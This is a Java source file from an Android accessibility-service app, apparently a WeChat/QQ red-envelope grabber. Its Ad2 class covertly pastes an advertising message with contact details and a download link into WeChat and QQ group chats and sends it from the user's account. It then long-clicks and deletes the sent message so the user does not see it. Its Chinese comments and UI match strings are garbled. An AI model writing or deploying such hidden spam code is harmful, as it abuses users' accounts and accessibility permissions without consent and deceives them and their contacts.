/**
 * 
 */
package ad;


import accessibility.QiangHongBaoService;
import android.annotation.TargetApi;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import accessibility.AccessibilityHelper;
import util.ConfigCt;
import com.example.h3.Config;

/**
 * @author ASUS
 *
 */
public class Ad2 {
	public static final String WX_WINDOW_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";//΢��Ⱥ�ģ����Ĵ��ڣ�
	public static final String QQ_WINDOW_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
	public static final String WX_PACKAGENAME = "com.tencent.mm";//΢�ŵİ���
	public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";//QQ�İ���
	private static final String EDIT_CLASS_NAME="android.widget.EditText";
	private static final String IMAG_BUTTON_CLASS_NAME="android.widget.ImageButton";
	public static Ad2 current;//ʵ����
	public static Ad2 currentWX;//΢��ʵ����
	public static Ad2 currentQQ;//QQʵ����
	private Context context;
	private String mCurrentUI="";
	public String mPackageName="";
	//private AccessibilityNodeInfo mRootNode; //��������
	public int mADmax=500;//�������
	public int mADcount=1;//����������
	public static String mStrAD=ConfigCt.ad+"��ϵ"+ConfigCt.contact+"���ص�ַ�����Ƶ�������򿪣���"+ConfigCt.homepage;//����
	public static boolean bReg=ConfigCt.bReg;//
	public boolean bLuckyMoneySend=false;//Ⱥ�����к�����������
	public static String TAG="byc001";
	private static int mWXversion=0;
	private static int mQQversion=0;
	private static final int JOY_IN_OTHER=0;//��Ϸƽ̨��ý��֮�⣻
	private static final int JOY_IN_WX=1;//��Ϸƽ̨��΢�ţ�
	private static final int JOY_IN_QQ=2;//��Ϸƽ̨��qq��
	private static int mJoy=JOY_IN_WX;//��ǰ��Ϸ΢�ţ�
	private boolean bSend=false;//�ѷ�����Ϣ��
	private boolean bPast=false;//��ճ����Ϣ��
	private boolean bWorking=false;//��������
	private static QiangHongBaoService service;
	
	private Ad2(QiangHongBaoService service,String PackageName) {
		Ad2.service = service;
		context=(Context)service;
	    this.mPackageName=PackageName;
	    mADmax=getADinterval(service,PackageName);
	    if(PackageName.equals(WX_PACKAGENAME)){
	        mWXversion=getWXversion(service);  
	        VersionParam.init(mWXversion);
	    }
	    if(PackageName.equals(QQ_PACKAGENAME)){
	       mQQversion=getQQversion(service);
	    }
	        //initVersionParam(0);
	}
	public static synchronized Ad2 getAd2(QiangHongBaoService service,String PackageName) {
		if(PackageName.equals(WX_PACKAGENAME)){
	    	if(currentWX == null) {
	    			currentWX= new Ad2(service,WX_PACKAGENAME);
	    	}
	    	return currentWX;
		}
		if(PackageName.equals(QQ_PACKAGENAME)){
			if(currentQQ == null) {currentQQ= new Ad2(service,QQ_PACKAGENAME);}
			return currentQQ;
		}
		if(current == null) {
			current = new Ad2(service,PackageName);
		}
		return current;
	}
	/*
	* ����������
	*/
	public int getADinterval(Context context,String PackageName){
	    	bLuckyMoneySend=ConfigCt.bLuckyMoneySend;
	    	mADmax=ConfigCt.NoRegUserSendADinterval;//�������
	    	//1.ע���
	    	bReg=Config.bReg;
	    	//if(bReg)if(Config.getConfig(context).getRegCode().equals(Config.RegCode))bReg=false;
	    	if(bReg){
	    		mADmax=ConfigCt.RegUserSendADinterval;//���淢�������
	    	}   	   	
	    	if(PackageName.equals(WX_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_QQ){//��ǰ��Ϸ��QQ��΢��֮��,�������
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	if(PackageName.equals(QQ_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_WX){//��ǰ��Ϸ��QQ��΢��֮��,�������
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	return mADmax;
	}
	    /*
	     * ����������
	     */
	public int getADinterval(){
	    	if(this.mPackageName.equals(""))return 500;
	    	String PackageName=this.mPackageName;
	    	bLuckyMoneySend=ConfigCt.bLuckyMoneySend;
	    	mADmax=ConfigCt.NoRegUserSendADinterval;//�������
	    	//1.ע���
	    	bReg=Config.bReg;
	    	//if(bReg)if(Config.getConfig(this.context).getRegCode().equals(Config.RegCode))bReg=false;
	    	if(bReg){
	    		mADmax=ConfigCt.RegUserSendADinterval;//���淢�������
	    	}   	   	
	    	if(PackageName.equals(WX_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_QQ){//��ǰ��Ϸ��QQ��΢��֮��,�������
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	if(PackageName.equals(QQ_PACKAGENAME)){
	    		if(mJoy==JOY_IN_OTHER||mJoy==JOY_IN_WX){//��ǰ��Ϸ��QQ��΢��֮��,�������
	    			if(bReg)mADmax=ConfigCt.OtherMediaSendADinterval;
	    			bLuckyMoneySend=true;
	    		}
	    	}
	    	return mADmax;
	}
	    /*
	     *���ù���
	     */
	public static void setADsay(String say) {
	    	 mStrAD=say;//����
	}
	    /*
	     * ���չ�������
	     */
	public void onReceiveJob(AccessibilityEvent event) {
	    	final int eventType = event.getEventType();
	    	//String sClassName=event.getClassName().toString();
			//mRootNode=event.getSource();
			//if(mRootNode==null)return;
			//mRootNode=AccessibilityHelper.getRootNode(mRootNode);
			//AccessibilityHelper.recycle(mRootNode);
	    	//mADmax=getADinterval(context,event.getPackageName().toString());
			
	    	debug();
			//+++++++++++++++++++++++++++++++++���ڸı�+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
				if(event.getClassName()==null)return;
				if(event.getPackageName().equals(WX_PACKAGENAME)){
					mCurrentUI=event.getClassName().toString();
				}
				if(event.getPackageName().equals(QQ_PACKAGENAME)){
					mCurrentUI=event.getClassName().toString();
				}
			}
			//+++++++++++++++++++++++++++++++++���ݸı�+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
				if(event.getPackageName().equals(WX_PACKAGENAME)){
					WXsendAD(event);
				}
				if(event.getPackageName().equals(QQ_PACKAGENAME)){
					QQsendAD(event);
				}
			}
	}
	    /*
	     * ΢�ŷ��͹�棺
	     */
	public void WXsendAD(AccessibilityEvent event) {
		if(mCurrentUI.equals(WX_WINDOW_LAUNCHER_UI)){
			AccessibilityNodeInfo rootNode=event.getSource();
			if(rootNode==null)return;
			rootNode=AccessibilityHelper.getRootNode(rootNode);
			if(isMemberChatUi(rootNode)==0)return;
			mADcount=mADcount+1;
			Log.i(TAG, "mADcount="+mADcount);
			AccessibilityNodeInfo adNode=null;
			if(!bLuckyMoneySend){//Ⱥ�����к���򲻷�����棺
				adNode=AccessibilityHelper.findNodeInfosByText(rootNode, "΢�ź��", -1);
				if(adNode!=null)mADcount=1;
			}
			if(mADcount>mADmax){
				WXADStart();
				mADcount=mADmax-20;
				//WXsendADsay(mRootNode);//���ð淢����棻				
			}
		}
	}
	    /*���������Ϣ*/
	public boolean WXpastInfo(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo edtNode=AccessibilityHelper.findNodeInfosByClassName(rootNode,EDIT_CLASS_NAME,0,true);
		if(edtNode==null)return false;
		if(nodeInput(edtNode,mStrAD)){
			mADcount=1;
			bPast=true;
			return true;
		}
		return false;
	}
	    /*������Ͱ�ť*/
	public boolean WXclickSendButton(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo sendNode = AccessibilityHelper.findNodeInfosByText(rootNode, "����", -1);
		if(sendNode==null)return false;
		if(sendNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)){
			bSend=true;
			return true;
		}
		return false;
	}
    /*
     * ΢�ŵ����˵���ֹ���أ�
     */
    public void WXpopMenuNoCancel(AccessibilityNodeInfo rootNode) {
		//�жϵ����˵����壺--------------------------------------------------------
    	AccessibilityNodeInfo copyNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(copyNode==null)return;
    	AccessibilityNodeInfo favoriteNode=AccessibilityHelper.findNodeInfosByText(rootNode, "�ղ�",-1);
    	if(favoriteNode==null)return;
    	AccessibilityNodeInfo translateNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(translateNode==null)return;
    	AccessibilityNodeInfo moreNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(moreNode==null)return;
    	//����ղ�
    	AccessibilityHelper.performClick(favoriteNode);
    	//�������
    	AccessibilityHelper.performClick(moreNode);
    }
    /*
     * ΢�ŵ����˵�����ࣺ
     */
    public void WXpopMenuClickMore(AccessibilityNodeInfo rootNode) {
		//�жϵ����˵����壺--------------------------------------------------------
    	AccessibilityNodeInfo copyNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(copyNode==null)return;
    	AccessibilityNodeInfo favoriteNode=AccessibilityHelper.findNodeInfosByText(rootNode, "�ղ�",-1);
    	if(favoriteNode==null)return;
    	AccessibilityNodeInfo translateNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(translateNode==null)return;
    	AccessibilityNodeInfo moreNode=AccessibilityHelper.findNodeInfosByText(rootNode, "����",-1);
    	if(moreNode==null)return;
    	//�������
    	AccessibilityHelper.performClick(moreNode);
    }
    /*
     * ΢�ŵ���ͼƬ�˵���ɾ��ͼƬ��ť��
     */
    public void WXpopClickDelImageButton(AccessibilityNodeInfo rootNode) {
    	if(isMemberChatUi(rootNode)==0)return;
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, EDIT_CLASS_NAME, -1, true);
    	if(nodeInfo!=null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByClassName(rootNode, IMAG_BUTTON_CLASS_NAME, -1, true);
    	if(nodeInfo==null)return;
    	if(AccessibilityHelper.classNames.size()>=4){
    		int size=AccessibilityHelper.classNames.size();
    		nodeInfo=AccessibilityHelper.classNames.get(size-2);
    		AccessibilityHelper.performClick(nodeInfo);
    	}
    }
    /*
     * ΢�ŵ����Ի����ɾ��ȷ����ť��
     */
    public void WXDialogClickDelOKButton(AccessibilityNodeInfo rootNode) {
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "ȷ��ɾ����",-1);
    	if(nodeInfo==null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "ȡ��",-1);
    	if(nodeInfo==null)return;
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ��",-1);
    	if(nodeInfo==null)return;
    	AccessibilityHelper.performClick(nodeInfo);
    	bWorking=false;
    }
    /** �Ƿ�ΪȺ����*/
    public int isMemberChatUi(AccessibilityNodeInfo rootInfo) {
        if(rootInfo == null)return 0;
        String title = null;
        AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosById(rootInfo, VersionParam.WIDGET_ID_GROUP_TITLE,0);
        if(nodeInfo == null)return 0;
        if(nodeInfo.getText()== null)return 0;
        title = String.valueOf(nodeInfo.getText());
        if(title.endsWith(")"))
            return 2;
        else
        	return 1;
    }
	    /*�����ı�*/
	@TargetApi(Build.VERSION_CODES.LOLLIPOP)
	public  boolean nodeInput(AccessibilityNodeInfo edtNode,String txt){
	    	if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP){//android 5.0
	    		Bundle arguments = new Bundle();
	        	arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
	        	edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
	        	return true;
	    	}
	    	if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
	    		ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);  
	    		ClipData clip = ClipData.newPlainText("text",txt);  
	    		clipboard.setPrimaryClip(clip);  

	    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);  
	    		////ճ����������  
	    		edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);  
	    		return true;
	    	}
	    	return false;
	}  
    /*
     * ��ʼ����
     */
	public void WXADworking(){
    	if(!bWorking)return;
    	AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
    	if(rootNode==null)return;
		if(!bPast){
			bPast=WXpastInfo(rootNode);
			if(!bPast){bWorking=false;return;}//��ճ��ʧ��ʱ��ֹͣ��棻
		}
		if(!bSend)bSend=WXclickSendButton(rootNode);
		//WXpopMenuNoCancel(rootNode);
		WXpopMenuClickMore(rootNode);
		WXpopClickDelImageButton(rootNode);
		WXDialogClickDelOKButton(rootNode);
	}
    /*
     * ��ʼ����
     */
	public void WXADStart(){
		  bWorking=true;
		  bPast=false;
		  bSend=false;
		  handlerWorking.postDelayed(runnableStop, 1000*60*3); 
		  handlerWorking.postDelayed(runnableWXADworking, 200); 
	}
	private Handler handlerWorking = new Handler();   
	/*
	 *3���Ӻ�ֹͣ����
	*/
	private Runnable runnableStop = new Runnable() {    
		@Override    
		public void run() {    
			bWorking=false;	   
		}    
	};
    /*
     * 200����ִ��һ��
     */
	private Runnable runnableWXADworking = new Runnable() {    
    	@Override    
    	public void run() {    
    		if(!bWorking)return;
    		WXADworking();
    		handlerWorking.postDelayed(this, 200);			   
    	}    
	};
	//++++++++++++++++++++++++++++++++++++++++++QQ+++++++++++++++++++++++++++++++++++++++++++
	 /*
     * QQ���͹�棺
     */
    public void QQsendAD(AccessibilityEvent event) {
    	if(mCurrentUI.equals(QQ_WINDOW_LAUNCHER_UI)){
		//-----------------------------------�������-----------------------------------------------
			AccessibilityNodeInfo rootNode=event.getSource();
			if(rootNode==null)return;
			rootNode=AccessibilityHelper.getRootNode(rootNode);
			if(isQQMemberChatUi(rootNode)==0)return;
			mADcount=mADcount+1;
			Log.i(TAG, "mADcount="+mADcount);
			if(!bLuckyMoneySend){//Ⱥ�����к���򲻷�����棺
				AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "QQ���", -1);
				if(nodeInfo!=null)mADcount=1;
			}
			if(mADcount>mADmax){
				QQADStart();
				mADcount=mADmax-20;
				//WXsendADsay(mRootNode);//���ð淢����棻				
			}
			//if(Config.getConfig(context).bAutoClearThunder)clickLuckyMoney();
		}//if(mCurrentUI.equals(Config.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
    }
    /** �Ƿ�ΪȺ����*/
    public int isQQMemberChatUi(AccessibilityNodeInfo rootNode) {
    	
    	String desc = "Ⱥ���Ͽ�";
    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, desc, 0);
    	if(nodeInfo!=null)return 2;
    	desc = "��������";
    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, desc, 0);
    	if(nodeInfo!=null)return 1;
    	return 0;
    }
    /*
     * ��ʼ����
     */
	public void QQADworking(){
    	if(!bWorking)return;
    	AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
    	if(rootNode==null)return;
    	if(isQQMemberChatUi(rootNode)>0){
    		if(!bPast){
    			bPast=QQpastInfo(rootNode);
    			if(!bPast){bWorking=false;return;}//��ճ��ʧ��ʱ��ֹͣ��棻
    		}
    		if(!bSend)bSend=QQclickSendButton(rootNode);
    		if(QQLongclickADsay(rootNode))return;
    	}
    	if(QQisPopmenuUi(rootNode))return;
		if(QQDialogDelADsay(rootNode))bWorking=false;
	}
    /*
     * ��ʼ����
     */
	public void QQADStart(){
		  bWorking=true;
		  bPast=false;
		  bSend=false;
		  handlerWorking.postDelayed(runnableStop, 1000*60*3); 
		  handlerWorking.postDelayed(runnableQQADworking, 200); 
	}
    /*
     * 200����ִ��һ��
     */
	private Runnable runnableQQADworking = new Runnable() {    
    	@Override    
    	public void run() {    
    		if(!bWorking)return;
    		QQADworking();
    		handlerWorking.postDelayed(this, 200);			   
    	}    
	};
	//-------------------------------------------------------------------------------------------
    /*���������Ϣ*/
	public boolean QQpastInfo(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo edtNode=AccessibilityHelper.findNodeInfosByClassName(rootNode,EDIT_CLASS_NAME,0,true);
		if(edtNode==null)return false;
		if(nodeInput(edtNode,mStrAD)){
			mADcount=1;
			bPast=true;
			return true;
		}
	return false;
	}
    /*������Ͱ�ť*/
	public boolean QQclickSendButton(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo sendNode = AccessibilityHelper.findNodeInfosByText(rootNode, "����", -1);
		if(sendNode==null)return false;
		if(sendNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)){
			bSend=true;
			return true;
		}
		return false;
	}
    /*���������*/
	public boolean QQLongclickADsay(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode,mStrAD ,-1);
		if(nodeInfo!=null){
			return AccessibilityHelper.performLongClick(nodeInfo);
		}
		return false;
	}
    /** �Ƿ�Ϊ�����˵�*/
    public boolean QQisPopmenuUi(AccessibilityNodeInfo rootNode) {
        if(rootNode == null) {
            return false;
        }
        String txt="����";
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        txt="����";
        target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        txt="ɾ��";
        target = AccessibilityHelper.findNodeInfosByText(rootNode, txt, 0);
        if(target == null)return false;
        AccessibilityHelper.performClick(target);
        
       return true;
    }
    /*
     * QQɾ�������Ի���
     */
    public boolean QQDialogDelADsay(AccessibilityNodeInfo rootNode) {
		//�����˵����壺-----------------ɾ�� �����---------------------------------------------------------
		//-------------------------ɾ����Ϣ�Ի���------------------------------------------------------
		AccessibilityNodeInfo delNode=AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ���󽫲�������������Ϣ��¼��",-1);
		if(delNode==null)return false;
		delNode=AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ��",-1);
		if(delNode==null)return false;
		return AccessibilityHelper.performClick(delNode);
    }
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	/** ΢�Ű��汾*/
    private int getWXversion(Context context) {
        try {
        	PackageInfo WechatPackageInfo =context.getPackageManager().getPackageInfo(WX_PACKAGENAME, 0);
            int v=WechatPackageInfo.versionCode;
            Log.i(TAG, "�ڲ��汾�ţ�"+v+"���ⲿ�汾�ţ�"+WechatPackageInfo.versionName);
            return v;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            
        }
        return 0;
    }
    /** QQ�汾*/
    private int getQQversion(Context context) {
        try {
        	PackageInfo QQPackageInfo =context.getPackageManager().getPackageInfo(QQ_PACKAGENAME, 0);
            int v=QQPackageInfo.versionCode;
            Log.i(TAG, "�ڲ��汾�ţ�"+v+"���ⲿ�汾�ţ�"+QQPackageInfo.versionName);
            return v;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            
        }
        return 0;
    }
    private void debug(){
    	if(ConfigCt.DEBUG){
    		//Log.i(Config.TAG2, "mADcount:"+mADcount);
    	}
    }
}
